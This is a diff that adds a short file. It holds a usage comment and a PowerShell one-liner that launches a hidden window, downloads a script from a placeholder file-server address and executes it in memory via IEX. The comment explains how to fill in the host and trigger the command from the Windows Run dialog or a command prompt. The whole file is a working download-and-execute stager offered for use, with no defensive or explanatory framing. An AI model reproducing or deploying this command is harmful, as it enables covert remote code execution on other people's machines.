@@ -1,0 +1,2 @@
+# USAGE: Replace "[FILESERVER_ADRESS]" with the adress of your fileserver in the line beneath this one. Then, while the fileserver is serving on port 80 on the given adress, execute the string in the line below in the "Run" window (win key + r). Optionally, it can be run in a command prompt if you append the following string (without the single quotes) to the beginning: 'start "" '
+powershell -windowstyle hidden "IEX (New-Object Net.WebClient).DownloadString('[FILESERVER_ADRESS]');"
